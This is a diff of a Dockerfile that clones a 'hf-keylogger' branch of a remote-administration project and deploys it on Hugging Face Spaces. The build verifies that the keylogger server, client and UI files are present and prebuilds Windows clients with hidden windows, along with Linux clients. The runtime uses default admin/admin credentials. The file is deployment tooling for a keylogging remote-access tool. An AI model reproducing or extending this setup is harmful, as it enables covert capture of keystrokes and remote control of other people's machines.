@@ -1,23 +1,34 @@
 # syntax=docker/dockerfile:1
 
-# This Dockerfile is for Hugging Face Spaces when you ONLY upload a Dockerfile.
-# It clones your GitHub repo at build time and then builds & runs the app.
-
 FROM golang:1.18-alpine AS build
 WORKDIR /src
-RUN apk add --no-cache git nodejs npm
+RUN apk add --no-cache git nodejs npm bash
 
-# Configure which repo/branch to clone (override in Space Build Args if needed)
+# Build args (override in HF Space if needed)
 ARG REPO=https://github.com/featherops/sparkv2.git
-# Leave REF empty to use the repository default branch
-ARG REF=
-# Clone default branch; if REF is provided and exists, switch to it
-RUN git clone --depth 1 ${REPO} . \
-    && if [ -n "${REF}" ] && git ls-remote --heads origin ${REF} | grep -q ${REF}; then \
-         git fetch --depth 1 origin ${REF} && git checkout -q FETCH_HEAD; \
-       fi
+ARG REF=hf-keylogger
+ARG CACHE_BUST=unset
+RUN echo "CACHE_BUST=${CACHE_BUST}"
 
-# Build web assets (including keylogger components)
+# Fresh clone of the exact ref
+RUN rm -rf ./* .git || true \
+ && git clone --depth 1 ${REPO} . \
+ && git fetch --depth 1 origin ${REF} \
+ && git checkout -q FETCH_HEAD \
+ && echo "Git HEAD: $(git rev-parse HEAD)"
+
+# Normalize case if committed from Windows with uppercase dirs
+RUN if [ -d server/handler/Keylogger ] && [ ! -d server/handler/keylogger ]; then mv server/handler/Keylogger server/handler/keylogger; fi
+RUN if [ -d client/service/Keylogger ] && [ ! -d client/service/keylogger ]; then mv client/service/Keylogger client/service/keylogger; fi
+RUN if [ -d web/src/components/Keylogger ] && [ ! -d web/src/components/keylogger ]; then mv web/src/components/Keylogger web/src/components/keylogger; fi
+
+# Sanity checks (fail early if files are missing)
+RUN ls -R server/handler || true \
+ && test -f server/handler/keylogger/keylogger.go || (echo 'ERROR: missing server/handler/keylogger/keylogger.go' && exit 1) \
+ && test -f client/service/keylogger/keylogger.go || (echo 'ERROR: missing client/service/keylogger/keylogger.go' && exit 1) \
+ && test -f web/src/components/keylogger/keylogger.jsx || (echo 'ERROR: missing web/src/components/keylogger/keylogger.jsx' && exit 1)
+
+# Build web (includes keylogger UI)
 WORKDIR /src/web
 RUN npm ci --no-audit --no-fund
 RUN NODE_ENV=production npx webpack --mode production
@@ -33,11 +44,11 @@ RUN go build -o spark-server ./server
 
 # Prebuild client templates required by generator
 RUN mkdir -p built \
-    && CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui" -o built/windows_amd64 ./client \
-    && CGO_ENABLED=0 GOOS=windows GOARCH=386   go build -ldflags "-H=windowsgui" -o built/windows_i386  ./client \
-    && CGO_ENABLED=0 GOOS=linux   GOARCH=amd64 go build -o built/linux_amd64   ./client \
-    && CGO_ENABLED=0 GOOS=linux   GOARCH=arm64 go build -o built/linux_arm64   ./client \
-    && CGO_ENABLED=0 GOOS=linux   GOARCH=arm GOARM=7 go build -o built/linux_arm ./client
+ && CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui" -o built/windows_amd64 ./client \
+ && CGO_ENABLED=0 GOOS=windows GOARCH=386   go build -ldflags "-H=windowsgui" -o built/windows_i386  ./client \
+ && CGO_ENABLED=0 GOOS=linux   GOARCH=amd64 go build -o built/linux_amd64   ./client \
+ && CGO_ENABLED=0 GOOS=linux   GOARCH=arm64 go build -o built/linux_arm64   ./client \
+ && CGO_ENABLED=0 GOOS=linux   GOARCH=arm GOARM=7 go build -o built/linux_arm ./client
 
 FROM alpine:3.19
 WORKDIR /app
@@ -46,17 +57,16 @@ COPY --from=build /src/spark-server /app/spark-server
 COPY --from=build /src/server/embed /app/server/embed
 COPY --from=build /src/built /app/built
 
-# Runtime configuration via env. Override these in Space Secrets.
+# Runtime env (override via Space Secrets)
 ENV PORT=7860 \
     SPARK_AUTH_USER=admin \
     SPARK_AUTH_PASS=admin \
     SPARK_LOG_LEVEL=info
 
-# Minimal config.json (listen overridden by PORT at runtime)
+# Minimal config.json (PORT overrides listen at runtime)
 RUN echo '{"listen":":8000","salt":"mysalthash123","auth":{},"log":{"level":"info","path":"./logs","days":7}}' > /app/config.json
 RUN mkdir -p /app/logs && chown -R spark:spark /app
 
 EXPOSE 7860
 USER spark
 CMD ["/app/spark-server", "-config", "/app/config.json"]
-
